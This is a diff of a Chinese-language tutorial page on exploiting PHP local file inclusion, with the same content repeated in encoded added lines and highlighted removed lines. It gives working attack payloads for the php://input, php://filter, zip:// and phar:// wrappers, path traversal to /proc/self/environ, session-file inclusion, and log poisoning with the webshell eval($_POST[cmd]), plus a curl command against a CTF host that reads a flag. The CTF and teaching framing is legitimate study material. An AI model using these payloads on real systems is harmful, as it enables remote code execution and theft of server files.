+<h3 id="phpfilter----&#x5229;&#x7528;&#x4E3B;&#x8981;&#x662F;&#x5229;&#x7528;&#x4E86;resource&#x548C;vonvert&#xFF0C;&#x8FD9;&#x6837;&#x53EF;&#x4EE5;&#x8BFB;&#x53D6;&#x5230;php&#x7684;&#x4EE3;&#x7801;-"><strong> php://filter </strong>-- &#x5229;&#x7528;&#x4E3B;&#x8981;&#x662F;&#x5229;&#x7528;&#x4E86;resource&#x548C;vonvert&#xFF0C;&#x8FD9;&#x6837;&#x53EF;&#x4EE5;&#x8BFB;&#x53D6;&#x5230;php&#x7684;&#x4EE3;&#x7801; =========================</h3><p>ctf &#x8D5B;&#x4E8B;&#x4E2D;&#xFF0C;url&#x53C2;&#x6570;&#x503C;&#x51FA;&#x73B0;&#x5F88;&#x50CF;&#x6587;&#x4EF6;&#x540D;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5F88;&#x6709;&#x53EF;&#x80FD;&#x662F; &#x672C;&#x5730;&#x6587;&#x4EF6;&#x5305;&#x542B;&#xFF0C; &#x53EF;&#x5229;&#x7528; filter &#x534F;&#x8BAE;&#x8BFB;&#x6E90;&#x7801;&#xFF0C; &#x901A;&#x5E38; flag &#x5728; flag.php info.php phpinfo.php &#x8FD9;&#x51E0;&#x4E2A;&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x4F18;&#x5148;&#x8003;&#x8651;</p><blockquote><p>php5.0&#x4EE5;&#x4E0A;</p></blockquote><pre><code>?url=php://filter/convert.base64-encode/resource=test.txt 
 
+?url=php://filter/convert.base64-encode/resource=http://127.0.0.1/test/test.txt</code></pre>
+<p>&#x5B9E;&#x6218;&#xFF1A;</p><pre><code>$ curl ctf.sharif.edu:31455/chal/technews/634770c075a17b83/images.php?id=php://filter/resource=files/images/robot.jpg/resource=files/flag/flag.txt</code></pre>
+<p>&#x5411;&#x78C1;&#x76D8;&#x5199;&#x6587;&#x4EF6;</p><pre><code>&lt;?php
+&#x3000;&#x3000;/* &#x8FD9;&#x4F1A;&#x901A;&#x8FC7; rot13 &#x8FC7;&#x6EE4;&#x5668;&#x7B5B;&#x9009;&#x51FA;&#x5B57;&#x7B26; &quot;Hello World&quot;
+&#x3000;&#x3000;&#x7136;&#x540E;&#x5199;&#x5165;&#x5F53;&#x524D;&#x76EE;&#x5F55;&#x4E0B;&#x7684; example.txt */
+&#x3000;&#x3000;file_put_contents(&quot;php://filter/write=string.rot13/resource=example.txt&quot;,&quot;Hello World&quot;);
+?&gt;</code></pre>
+<p>&#x8FD9;&#x4E2A;&#x53C2;&#x6570;&#x91C7;&#x7528;&#x4E00;&#x4E2A;&#x6216;&#x4EE5;&#x7BA1;&#x9053;&#x7B26; | &#x5206;&#x9694;&#x7684;&#x591A;&#x4E2A;&#x8FC7;&#x6EE4;&#x5668;&#x540D;&#x79F0;</p><h3 id="phpfd-"><strong> php://fd </strong></h3><blockquote><p>php 5.3.6&#x4E2D;&#x65B0;&#x589E;&#x52A0;</p></blockquote><h3 id="zip">zip://</h3><blockquote><p>allow_url_fopen=no</p></blockquote><pre><code># zip &#x5185;&#x542B;&#x76EE;&#x5F55;
+zip://archive.zip#dir/file.txt 
 
-<h3 id="phpinput-"><strong> php://input </strong> --</h3>
-<p>可以访问请求的原始数据的只读流(这个原始数据指的是POST数据)</p>
-<blockquote>
-<p>php5.0以下 和 php5.2 版本有效, allow_url_include=On</p>
-</blockquote>
-<p>LFI 导致 code excute</p>
-<div class="hlcode"><pre><span class="o">&lt;?</span><span class="nt">php</span> 
-<span class="err">　　</span><span class="k">@eval</span><span class="o">(</span><span class="nt">file_get_contents</span><span class="o">(</span><span class="s1">&#39;php://input&#39;</span><span class="o">))</span>
-<span class="o">?&gt;</span> 
-<span class="nt">http</span><span class="o">://</span><span class="nt">localhost</span><span class="o">/</span><span class="nt">test</span><span class="o">/</span><span class="nt">index</span><span class="nc">.php</span>
-<span class="nt">post</span><span class="o">:</span> <span class="nt">system</span><span class="o">(</span><span class="s2">&quot;dir&quot;</span><span class="o">)</span><span class="p">;</span>
-<span class="nt">result</span><span class="o">:</span> <span class="nt">list</span> <span class="nt">directory</span>
-</pre></div>
-
-
-<p>这本质上远程文件包含的利用，远程文件包含中的include接收的是一个"资源定位符"，在大多数情况下这是一个磁盘文件路径，但是从流的角度来看，这也可以是一个流资源定位符，即我们将include待包含的资源又重定向到了输入流中，从而可以输入我们的任意code到include中</p>
-<div class="hlcode"><pre><span class="o">&lt;?</span><span class="nt">php</span>
-<span class="err">　　</span><span class="k">@include</span><span class="o">(</span><span class="err">$</span><span class="nt">_GET</span><span class="cp">[</span><span class="s2">&quot;file&quot;</span><span class="cp">]</span><span class="o">)</span><span class="p">;</span>
-<span class="o">?&gt;</span>
-<span class="nt">http</span><span class="o">://</span><span class="nt">localhost</span><span class="o">/</span><span class="nt">test</span><span class="o">/</span><span class="nt">index</span><span class="nc">.php</span><span class="o">?</span><span class="nt">file</span><span class="o">=</span><span class="nt">php</span><span class="o">://</span><span class="nt">input</span>
-<span class="nt">post</span><span class="o">:</span> <span class="o">&lt;?</span><span class="nt">php</span> <span class="nt">system</span><span class="o">(</span><span class="s1">&#39;ipconfig&#39;</span><span class="o">);?&gt;</span>
-<span class="nt">result</span><span class="o">:</span> <span class="nt">ip</span> <span class="nt">information</span>
-</pre></div>
-
-
-<p>有一点要注意:</p>
-<div class="hlcode"><pre><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">&quot;solution.php&quot;</span><span class="p">);</span><span class="cp">?&gt;</span>
-</pre></div>
-
-
-<p>在利用文件包含进行代码执行的时候，我们通过file_get_contents获取到的文件内容，如果是一个.php文件，会被当作include的输入参数，也就意味着会被再执行一次，则我们无法看到原始代码了</p>
-<p>解决这个问题的方法就是使用base64_encode进行编码</p>
-<div class="hlcode"><pre><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">&quot;solution.php&quot;</span><span class="p">));</span><span class="cp">?&gt;</span>
-</pre></div>
-
-
-<h3 id="phpfilter-resourcevonvertphp"><strong> php://filter </strong>-- 利用主要是利用了resource和vonvert，这样可以读取到php的代码 =========================</h3>
-<p>ctf 赛事中，url参数值出现很像文件名的情况下，很有可能是 本地文件包含， 可利用 filter 协议读源码， 通常 flag 在 flag.php info.php phpinfo.php 这几个文件中，优先考虑</p>
-<blockquote>
-<p>php5.0以上</p>
-</blockquote>
-<div class="hlcode"><pre><span class="o">?</span><span class="n">url</span><span class="o">=</span><span class="n">php</span><span class="o">:</span><span class="c1">//filter/convert.base64-encode/resource=test.txt </span>
-
-<span class="o">?</span><span class="n">url</span><span class="o">=</span><span class="n">php</span><span class="o">:</span><span class="c1">//filter/convert.base64-encode/resource=http://127.0.0.1/test/test.txt</span>
-</pre></div>
-
-
-<p>实战：</p>
-<div class="hlcode"><pre><span class="err">$</span> <span class="n">curl</span> <span class="n">ctf</span><span class="p">.</span><span class="n">sharif</span><span class="p">.</span><span class="n">edu</span><span class="o">:</span><span class="mi">31455</span><span class="o">/</span><span class="n">chal</span><span class="o">/</span><span class="n">technews</span><span class="o">/</span><span class="mi">634770</span><span class="n">c075a17b83</span><span class="o">/</span><span class="n">images</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="n">php</span><span class="o">:</span><span class="c1">//filter/resource=files/images/robot.jpg/resource=files/flag/flag.txt</span>
-</pre></div>
-
-
-<p>向磁盘写文件</p>
-<div class="hlcode"><pre><span class="o">&lt;?</span><span class="nt">php</span>
-<span class="err">　　</span><span class="c">/* 这会通过 rot13 过滤器筛选出字符 &quot;Hello World&quot;</span>
-<span class="c">　　然后写入当前目录下的 example.txt */</span>
-<span class="err">　　</span><span class="nt">file_put_contents</span><span class="o">(</span><span class="s2">&quot;php://filter/write=string.rot13/resource=example.txt&quot;</span><span class="o">,</span><span class="s2">&quot;Hello World&quot;</span><span class="o">);</span>
-<span class="o">?&gt;</span>
-</pre></div>
-
-
-<p>这个参数采用一个或以管道符 | 分隔的多个过滤器名称</p>
-<h3 id="phpfd"><strong> php://fd </strong></h3>
-<blockquote>
-<p>php 5.3.6中新增加</p>
-</blockquote>
-<h3 id="zip">zip://</h3>
-<blockquote>
-<p>allow_url_fopen=no</p>
-</blockquote>
-<div class="hlcode"><pre><span class="cp"># zip 内含目录</span>
-<span class="nl">zip:</span><span class="c1">//archive.zip#dir/file.txt </span>
-
-<span class="cp"># url 中使用 &quot;%23&quot;(#)</span>
-<span class="o">?</span><span class="n">f</span><span class="o">=</span><span class="n">zip</span><span class="o">:</span><span class="c1">//path_to_zip%23inside_file_name</span>
-</pre></div>
-
-
-<p>文件压缩成zip包，压缩的时候注意要选择only store之类的选项，防止数据被压缩</p>
-<div class="hlcode"><pre><span class="n">zip</span> <span class="o">-</span><span class="mi">0</span> <span class="mf">1.</span><span class="n">zip</span> <span class="n">shell</span><span class="p">.</span><span class="n">php</span>
-</pre></div>
-
-
-<p><strong> 额外支持 </strong></p>
-<div class="hlcode"><pre><span class="n">fopen</span><span class="p">(</span><span class="err">&#39;</span><span class="n">zip</span><span class="o">:</span><span class="c1">//path/xx.zip#inside_file_name&#39;)</span>
-<span class="n">file_get_contents</span><span class="p">()</span>
-<span class="n">imagecreatefromgif</span><span class="p">()</span>
-</pre></div>
-
-
-<h3 id="phar">phar://</h3>
-<div class="hlcode"><pre><span class="o">?</span><span class="n">f</span><span class="o">=</span><span class="n">phar</span><span class="o">:</span><span class="c1">//php.zip/php.jpg</span>
-</pre></div>
-
-
-<p>与zip协议区别就是 phar 是用/来分隔而不是 #</p>
-<ul>
-<li><strong> glob </strong></li>
-</ul>
-<blockquote>
-<p>php&gt;5.3.0</p>
-</blockquote>
-<div class="hlcode"><pre><span class="n">DirectoryIterator</span><span class="p">(</span><span class="err">“</span><span class="n">glob</span><span class="o">:</span><span class="c1">//ext/spl/examples/*.php”)</span>
-</pre></div>
-
-
-<div class="hlcode"><pre><span class="o">&lt;?</span><span class="nt">php</span>
-<span class="err">　　</span><span class="o">//</span> <span class="err">循环</span> <span class="nt">ext</span><span class="o">/</span><span class="nt">spl</span><span class="o">/</span><span class="nt">examples</span><span class="o">/</span> <span class="err">目录里所有</span> <span class="o">*</span><span class="nc">.php</span> <span class="err">文件</span>
-<span class="err">　　</span><span class="o">//</span> <span class="err">并打印文件名和文件尺寸</span>
-<span class="err">　　$</span><span class="nt">it</span> <span class="o">=</span> <span class="nt">new</span> <span class="nt">DirectoryIterator</span><span class="o">(</span><span class="s2">&quot;glob://E:\\wamp\\www\\test\\*.php&quot;</span><span class="o">);</span>
-<span class="err">　　</span><span class="nt">foreach</span><span class="o">(</span><span class="err">$</span><span class="nt">it</span> <span class="nt">as</span> <span class="err">$</span><span class="nt">f</span><span class="o">)</span> 
-<span class="err">　　</span><span class="p">{</span>
-<span class="err">　　　　</span><span class="n">printf</span><span class="p">(</span><span class="s2">&quot;%s: %.1FK\n&quot;</span><span class="o">,</span> <span class="err">$</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">getFilename</span><span class="p">()</span><span class="o">,</span> <span class="err">$</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">getSize</span><span class="p">()</span><span class="o">/</span><span class="m">1024</span><span class="p">);</span>
-<span class="err">　　</span><span class="p">}</span>
-<span class="o">?&gt;</span>
-</pre></div>
-
-
-<h3 id="file">file://</h3>
-<p>越权访问本地文件</p>
-<p>file:// — 访问本地文件系统; 文件系统是PHP使用的默认封装协议，展现了本地文件系统</p>
-<div class="hlcode"><pre><span class="o">&lt;?</span><span class="nt">php</span>
-<span class="err">　　$</span><span class="nt">res</span> <span class="o">=</span> <span class="nt">file_get_contents</span><span class="o">(</span><span class="s2">&quot;file://E://wamp//www//test//solution.php&quot;</span><span class="o">);</span>
-<span class="err">　　</span><span class="nt">var_dump</span><span class="o">(</span><span class="err">$</span><span class="nt">res</span><span class="o">);</span>
-<span class="o">?&gt;</span>
-</pre></div>
-
-
-<p>file://这个伪协议可以展示"本地文件系统"，当存在某个用户可控制、并得以访问执行的输入点时，我们可以尝试输入file://去试图获取本地磁盘文件</p>
-<p>http://www.wechall.net/challenge/crappyshare/index.php</p>
-<p>http://www.wechall.net/challenge/crappyshare/crappyshare.php</p>
-<p>在这题CTF中，攻击的关键点在于：curl_exec($ch)</p>
-<div class="hlcode"><pre><span class="kd">function</span> <span class="nx">upload_please_by_url</span><span class="p">(</span><span class="nx">$url</span><span class="p">)</span>
-<span class="p">{</span> 
-<span class="err">　　</span><span class="k">if</span> <span class="p">(</span><span class="mi">1</span> <span class="o">===</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;#^</span><span class="cp">[</span><span class="nx">a</span><span class="na">-z</span><span class="cp">]</span><span class="s1">{3,5}://#&#39;</span><span class="p">,</span> <span class="nx">$url</span><span class="p">))</span> <span class="err">#</span> <span class="nx">Is</span> <span class="nx">URL</span><span class="o">?</span> 
-<span class="err">　　</span><span class="p">{</span>
-<span class="err">　　　　</span><span class="nx">$ch</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">(</span><span class="nx">$url</span><span class="p">);</span>
-<span class="err">　　　　</span><span class="nx">curl_setopt</span><span class="p">(</span><span class="nx">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
-<span class="err">　　　　</span><span class="nx">curl_setopt</span><span class="p">(</span><span class="nx">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_FOLLOWLOCATION</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
-<span class="err">　　　　</span><span class="nx">curl_setopt</span><span class="p">(</span><span class="nx">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_FAILONERROR</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
-<span class="err">　　　　</span><span class="k">if</span> <span class="p">(</span><span class="kc">false</span> <span class="o">===</span> <span class="p">(</span><span class="nx">$file_data</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nx">$ch</span><span class="p">)))</span>
-<span class="err">　　　　</span><span class="p">{</span>
-<span class="err">　　　　　　</span><span class="nx">htmlDisplayError</span><span class="p">(</span><span class="s1">&#39;cURL failed.&#39;</span><span class="p">);</span>
-<span class="err">　　　　</span><span class="p">}</span>
-<span class="err">　　　　</span><span class="k">else</span>
-<span class="err">　　　　</span><span class="p">{</span>
-<span class="err">　　　　　　</span><span class="c1">// Thanks</span>
-<span class="err">　　　　　　</span><span class="nx">upload_please_thx</span><span class="p">(</span><span class="nx">$file_data</span><span class="p">);</span>
-<span class="err">　　　　</span><span class="p">}</span>
-<span class="err">　　</span><span class="p">}</span>
-<span class="err">　　</span><span class="k">else</span>
-<span class="err">　　</span><span class="p">{</span>
-<span class="err">　　　　</span><span class="nx">htmlDisplayError</span><span class="p">(</span><span class="s1">&#39;Your URL looks errorneous.&#39;</span><span class="p">);</span>
-<span class="err">　　</span><span class="p">}</span>
-<span class="p">}</span>
-</pre></div>
-
-
-<p>当我们输入的file://参数被带入curl中执行时，原本的远程URL访问会被重定向到本地磁盘上，从而达到越权访问文件的目的</p>
-<h2 id="0x04-session">0x04 包含Session文件</h2>
-<p>包含Session文件的条件也较为苛刻，它需要攻击者能够"控制"部分Session文件的内容。</p>
-<div class="hlcode"><pre><span class="nt">x</span><span class="o">|</span><span class="nt">s</span><span class="nd">:19</span><span class="o">:</span><span class="s2">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>
-</pre></div>
-
-
-<p>PHP默认生成的Session文件往往存放在/tmp目录下</p>
-<div class="hlcode"><pre><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">sess_SESSIONID</span>
-</pre></div>
-
-
-<h2 id="0x05-procselfenviron">0x05 包含/proc/self/environ文件</h2>
-<p>包含/proc/self/environ是一种更通用的方法，因为它根本不需要猜测包包含文件的路径，同时用户也能控制它的内容</p>
-<div class="hlcode"><pre><span class="nl">http:</span><span class="c1">//192.168.159.128/index.php?file=../../../../../../../proc/self/environ</span>
-</pre></div>
-
-
-<h2 id="0x06">0x06 日记包含高级利用</h2>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2011-02236">济南大学主站本地文件包含导致代码执行</a></p>
-<p>限制</p>
-<blockquote>
-<p>类似http://www.exp.com/index&lt;?php eval($_POST[cmd]);?&gt;.php 
-这样的提交，某些WEB服务器将会把空格做HTTP编码转成%20写入web日志,如果PHP包含&lt;?php%20eval($_POST[cmd]);?&gt;这样的语句肯定是不会成功的，所以我们必须把空格真正的写入WEB日志.</p>
-</blockquote>
-<p>突破</p>
-<div class="hlcode"><pre><span class="cp">&lt;?</span><span class="cm">/**/</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nx">cmd</span><span class="p">]);</span><span class="cm">/**/</span><span class="cp">?&gt;</span>
-</pre></div>
-
-
+# url &#x4E2D;&#x4F7F;&#x7528; &quot;%23&quot;(#)
+?f=zip://path_to_zip%23inside_file_name</code></pre>
+<p>&#x6587;&#x4EF6;&#x538B;&#x7F29;&#x6210;zip&#x5305;&#xFF0C;&#x538B;&#x7F29;&#x7684;&#x65F6;&#x5019;&#x6CE8;&#x610F;&#x8981;&#x9009;&#x62E9;only store&#x4E4B;&#x7C7B;&#x7684;&#x9009;&#x9879;&#xFF0C;&#x9632;&#x6B62;&#x6570;&#x636E;&#x88AB;&#x538B;&#x7F29;</p><pre><code>zip -0 1.zip shell.php</code></pre>
+<p><strong> &#x989D;&#x5916;&#x652F;&#x6301; </strong></p><pre><code>fopen(&apos;zip://path/xx.zip#inside_file_name&apos;)
+file_get_contents()
+imagecreatefromgif()</code></pre>
+<h3 id="phar">phar://</h3><pre><code>?f=phar://php.zip/php.jpg</code></pre>
+<p>&#x4E0E;zip&#x534F;&#x8BAE;&#x533A;&#x522B;&#x5C31;&#x662F; phar &#x662F;&#x7528;/&#x6765;&#x5206;&#x9694;&#x800C;&#x4E0D;&#x662F; #</p><ul><li><strong> glob </strong>
+</li></ul>
+<blockquote><p>php&gt;5.3.0</p></blockquote><pre><code>DirectoryIterator(&#x201C;glob://ext/spl/examples/*.php&#x201D;)</code></pre>
+<pre><code>&lt;?php
+&#x3000;&#x3000;// &#x5FAA;&#x73AF; ext/spl/examples/ &#x76EE;&#x5F55;&#x91CC;&#x6240;&#x6709; *.php &#x6587;&#x4EF6;
+&#x3000;&#x3000;// &#x5E76;&#x6253;&#x5370;&#x6587;&#x4EF6;&#x540D;&#x548C;&#x6587;&#x4EF6;&#x5C3A;&#x5BF8;
+&#x3000;&#x3000;$it = new DirectoryIterator(&quot;glob://E:\\wamp\\www\\test\\*.php&quot;);
+&#x3000;&#x3000;foreach($it as $f) 
+&#x3000;&#x3000;{
+&#x3000;&#x3000;&#x3000;&#x3000;printf(&quot;%s: %.1FK\n&quot;, $f-&gt;getFilename(), $f-&gt;getSize()/1024);
+&#x3000;&#x3000;}
+?&gt;</code></pre>
+<h3 id="file">file://</h3><p>&#x8D8A;&#x6743;&#x8BBF;&#x95EE;&#x672C;&#x5730;&#x6587;&#x4EF6;</p><p>file:// &#x2014; &#x8BBF;&#x95EE;&#x672C;&#x5730;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;; &#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x662F;PHP&#x4F7F;&#x7528;&#x7684;&#x9ED8;&#x8BA4;&#x5C01;&#x88C5;&#x534F;&#x8BAE;&#xFF0C;&#x5C55;&#x73B0;&#x4E86;&#x672C;&#x5730;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;</p><pre><code>&lt;?php
+&#x3000;&#x3000;$res = file_get_contents(&quot;file://E://wamp//www//test//solution.php&quot;);
+&#x3000;&#x3000;var_dump($res);
+?&gt;</code></pre>
+<p>file://&#x8FD9;&#x4E2A;&#x4F2A;&#x534F;&#x8BAE;&#x53EF;&#x4EE5;&#x5C55;&#x793A;&quot;&#x672C;&#x5730;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&quot;&#xFF0C;&#x5F53;&#x5B58;&#x5728;&#x67D0;&#x4E2A;&#x7528;&#x6237;&#x53EF;&#x63A7;&#x5236;&#x3001;&#x5E76;&#x5F97;&#x4EE5;&#x8BBF;&#x95EE;&#x6267;&#x884C;&#x7684;&#x8F93;&#x5165;&#x70B9;&#x65F6;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x8F93;&#x5165;file://&#x53BB;&#x8BD5;&#x56FE;&#x83B7;&#x53D6;&#x672C;&#x5730;&#x78C1;&#x76D8;&#x6587;&#x4EF6;</p><p><a href="http://www.wechall.net/challenge/crappyshare/index.php" target="_blank">http://www.wechall.net/challenge/crappyshare/index.php</a></p><p><a href="http://www.wechall.net/challenge/crappyshare/crappyshare.php" target="_blank">http://www.wechall.net/challenge/crappyshare/crappyshare.php</a></p><p>&#x5728;&#x8FD9;&#x9898;CTF&#x4E2D;&#xFF0C;&#x653B;&#x51FB;&#x7684;&#x5173;&#x952E;&#x70B9;&#x5728;&#x4E8E;&#xFF1A;curl_exec($ch)</p><pre><code>function upload_please_by_url($url)
+{ 
+&#x3000;&#x3000;if (1 === preg_match(&apos;#^[a-z]{3,5}://#&apos;, $url)) # Is URL? 
+&#x3000;&#x3000;{
+&#x3000;&#x3000;&#x3000;&#x3000;$ch = curl_init($url);
+&#x3000;&#x3000;&#x3000;&#x3000;curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+&#x3000;&#x3000;&#x3000;&#x3000;curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+&#x3000;&#x3000;&#x3000;&#x3000;curl_setopt($ch, CURLOPT_FAILONERROR, true);
+&#x3000;&#x3000;&#x3000;&#x3000;if (false === ($file_data = curl_exec($ch)))
+&#x3000;&#x3000;&#x3000;&#x3000;{
+&#x3000;&#x3000;&#x3000;&#x3000;&#x3000;&#x3000;htmlDisplayError(&apos;cURL failed.&apos;);
+&#x3000;&#x3000;&#x3000;&#x3000;}
+&#x3000;&#x3000;&#x3000;&#x3000;else
+&#x3000;&#x3000;&#x3000;&#x3000;{
+&#x3000;&#x3000;&#x3000;&#x3000;&#x3000;&#x3000;// Thanks
+&#x3000;&#x3000;&#x3000;&#x3000;&#x3000;&#x3000;upload_please_thx($file_data);
+&#x3000;&#x3000;&#x3000;&#x3000;}
+&#x3000;&#x3000;}
+&#x3000;&#x3000;else
+&#x3000;&#x3000;{
+&#x3000;&#x3000;&#x3000;&#x3000;htmlDisplayError(&apos;Your URL looks errorneous.&apos;);
+&#x3000;&#x3000;}
+}</code></pre>
+<p>&#x5F53;&#x6211;&#x4EEC;&#x8F93;&#x5165;&#x7684;file://&#x53C2;&#x6570;&#x88AB;&#x5E26;&#x5165;curl&#x4E2D;&#x6267;&#x884C;&#x65F6;&#xFF0C;&#x539F;&#x672C;&#x7684;&#x8FDC;&#x7A0B;URL&#x8BBF;&#x95EE;&#x4F1A;&#x88AB;&#x91CD;&#x5B9A;&#x5411;&#x5230;&#x672C;&#x5730;&#x78C1;&#x76D8;&#x4E0A;&#xFF0C;&#x4ECE;&#x800C;&#x8FBE;&#x5230;&#x8D8A;&#x6743;&#x8BBF;&#x95EE;&#x6587;&#x4EF6;&#x7684;&#x76EE;&#x7684;</p><h2 id="0x04-&#x5305;&#x542B;session&#x6587;&#x4EF6;">0x04 &#x5305;&#x542B;Session&#x6587;&#x4EF6;</h2><p>&#x5305;&#x542B;Session&#x6587;&#x4EF6;&#x7684;&#x6761;&#x4EF6;&#x4E5F;&#x8F83;&#x4E3A;&#x82DB;&#x523B;&#xFF0C;&#x5B83;&#x9700;&#x8981;&#x653B;&#x51FB;&#x8005;&#x80FD;&#x591F;&quot;&#x63A7;&#x5236;&quot;&#x90E8;&#x5206;Session&#x6587;&#x4EF6;&#x7684;&#x5185;&#x5BB9;&#x3002;</p><pre><code>x|s:19:&quot;&lt;?php phpinfo(); ?&gt;&quot;</code></pre>
+<p>PHP&#x9ED8;&#x8BA4;&#x751F;&#x6210;&#x7684;Session&#x6587;&#x4EF6;&#x5F80;&#x5F80;&#x5B58;&#x653E;&#x5728;/tmp&#x76EE;&#x5F55;&#x4E0B;</p><pre><code>/tmp/sess_SESSIONID</code></pre>
+<h2 id="0x05-&#x5305;&#x542B;procselfenviron&#x6587;&#x4EF6;">0x05 &#x5305;&#x542B;/proc/self/environ&#x6587;&#x4EF6;</h2><p>&#x5305;&#x542B;/proc/self/environ&#x662F;&#x4E00;&#x79CD;&#x66F4;&#x901A;&#x7528;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x56E0;&#x4E3A;&#x5B83;&#x6839;&#x672C;&#x4E0D;&#x9700;&#x8981;&#x731C;&#x6D4B;&#x5305;&#x5305;&#x542B;&#x6587;&#x4EF6;&#x7684;&#x8DEF;&#x5F84;&#xFF0C;&#x540C;&#x65F6;&#x7528;&#x6237;&#x4E5F;&#x80FD;&#x63A7;&#x5236;&#x5B83;&#x7684;&#x5185;&#x5BB9;</p><pre><code>http://192.168.159.128/index.php?file=../../../../../../../proc/self/environ</code></pre>
+<h2 id="0x06-&#x65E5;&#x8BB0;&#x5305;&#x542B;&#x9AD8;&#x7EA7;&#x5229;&#x7528;">0x06 &#x65E5;&#x8BB0;&#x5305;&#x542B;&#x9AD8;&#x7EA7;&#x5229;&#x7528;</h2><p><a href="http://www.wooyun.org/bugs/wooyun-2011-02236" target="_blank">&#x6D4E;&#x5357;&#x5927;&#x5B66;&#x4E3B;&#x7AD9;&#x672C;&#x5730;&#x6587;&#x4EF6;&#x5305;&#x542B;&#x5BFC;&#x81F4;&#x4EE3;&#x7801;&#x6267;&#x884C;</a></p><p>&#x9650;&#x5236;</p><blockquote><p>&#x7C7B;&#x4F3C;<a href="http://www.exp.com/index" target="_blank">http://www.exp.com/index</a>&lt;?php eval($_POST[cmd]);?&gt;.php 
+&#x8FD9;&#x6837;&#x7684;&#x63D0;&#x4EA4;&#xFF0C;&#x67D0;&#x4E9B;WEB&#x670D;&#x52A1;&#x5668;&#x5C06;&#x4F1A;&#x628A;&#x7A7A;&#x683C;&#x505A;HTTP&#x7F16;&#x7801;&#x8F6C;&#x6210;%20&#x5199;&#x5165;web&#x65E5;&#x5FD7;,&#x5982;&#x679C;PHP&#x5305;&#x542B;&lt;?php%20eval($_POST[cmd]);?&gt;&#x8FD9;&#x6837;&#x7684;&#x8BED;&#x53E5;&#x80AF;&#x5B9A;&#x662F;&#x4E0D;&#x4F1A;&#x6210;&#x529F;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5FC5;&#x987B;&#x628A;&#x7A7A;&#x683C;&#x771F;&#x6B63;&#x7684;&#x5199;&#x5165;WEB&#x65E5;&#x5FD7;.</p></blockquote><p>&#x7A81;&#x7834;</p><pre><code>&lt;?/**/eval($_POST[cmd]);/**/?&gt;</code></pre>
 <p>1.short_open_tag=on
-这类情况写入web日志，只能在short_open_tag=on的情况下才能有效，当short_open_tag=off时，PHP将不支持&lt;?/<strong>/eval($_POST[cmd]);/</strong>/?&gt;这样的短语句</p>
-<p>2.WEB服务器一个奇怪的特性</p>
-<p>如果没有返回响应而WEB服务器又接受了请求，那么请求的内容将原封不动的写入WEB日志，不会进行HTTP编码.</p>
-<p>这样我们想个办法一直与WEB服务器保持TCP连接，不让WEB服务器处理响应返回，然后再由客户端的我们中断这次TCP连接，说得这么复杂其实很容易实现.只要在HTTP请求的数据包中去掉Connection HTTP标头值。</p>
-<p>利用NC伪造没有Connection HTTP标头的请求包：</p>
-<div class="hlcode"><pre><span class="n">GET</span> <span class="o">/</span><span class="n">index</span><span class="o">&lt;</span> <span class="o">&gt;</span><span class="p">.</span><span class="n">php</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
-<span class="nl">Accept:</span> <span class="err">*/</span><span class="o">*</span>
-<span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="o">:</span> <span class="n">zh</span><span class="o">-</span><span class="n">cn</span>
-<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="o">:</span> <span class="n">gzip</span><span class="p">,</span> <span class="n">deflate</span>
-<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="o">:</span> <span class="n">Mozilla</span><span class="o">/</span><span class="mf">4.0</span> <span class="p">(</span><span class="n">compatible</span><span class="p">;</span> <span class="n">MSIE</span> <span class="mf">6.0</span><span class="p">;</span> <span class="n">Windows</span> <span class="n">NT</span> <span class="mf">5.1</span><span class="p">;</span> <span class="n">SV1</span><span class="p">;</span> <span class="p">.</span><span class="n">NET</span> <span class="n">CLR</span> <span class="mf">2.0.50727</span><span class="p">)</span>
-<span class="nl">Host:</span> <span class="mf">192.168.3.44</span>
-</pre></div>
